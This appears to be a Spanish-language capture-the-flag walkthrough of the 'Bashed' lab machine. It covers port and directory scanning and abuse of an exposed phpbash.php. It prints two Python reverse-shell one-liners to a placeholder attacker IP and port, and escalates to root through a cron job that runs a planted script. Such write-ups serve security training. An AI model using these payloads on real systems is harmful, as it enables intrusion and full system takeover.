<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bashed</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Bashed</h1><br/><p><ol><li>Hago un escaneo de puertos</br><strong> nmap -Pn -sV -sC -p- --open 10.10.10.68 -oN scan.txt</strong></li><li>Solo hay un servicio HTTP abierto</li><li>A primera vista no encuentro nada interesante</li><li>Hago una enumeración de directorios con dirb</br><strong> dirb <a href="http://10.10.10.68/">http://10.10.10.68/</a></strong></li><li>Encuentro un par de directorios interesantes con /dev/ y /uploads/</li><li>En el directorio /dev/ se encuentran dos archivos</li><li>El archivo phpbash.php nos devuelve una interfaz</li><li>Podemos obtener un reverse shell de  php </li><li>Primero ponemos el listener </li></ol><img src="images/26-1.png" alt="images/26-1.png" /><ol><li>Uso la siguiente script<strong> python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;));</strong><strong> os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</strong></li><li>Podemos ejecutar comandos sudo con el usuario scriptmanager</li></ol></p><p>  <img src="images/26-2.png" alt="images/26-2.png" /><ol><li>Cambiamos al usuario scriptmanager</li></ol></p><p>  <img src="images/26-3.png" alt="images/26-3.png" /><ol><li>Descargo linpeas.sh en la máquina atacada para buscar una posible privesc.</li><li>Después de ejecutar linpeas nos encuentra la carpeta /scripts</li><li>En ella podemos ver que la script <strong>test.py</strong> escribe en el archivo <strong>test.txt</strong></li><li><strong>test.txt</strong> fue creado por el usuario <strong>root</strong> pero podemos usar <strong>test.py</strong> para editarlo y escalar privilegios</li><li>Algo está corriendo la scriptm test.py del directorio /scripts</li><li>Parece ser que hay un cron que ejecute las scripts creadas dentro del directorio scripts</li><li>Creo el exploit <h3> </h3><strong>echo &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&lt;IP&gt;\&quot;,&lt;PORT&gt;));os.dup2(s.fileno(),0);</strong><strong>   os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&quot; &gt; .exploit.py</strong></li><li>Activo el listener</li><li>Recibo el reverse shell como root</li></ol></p><p align="center"></p></div>
</body>
</html>
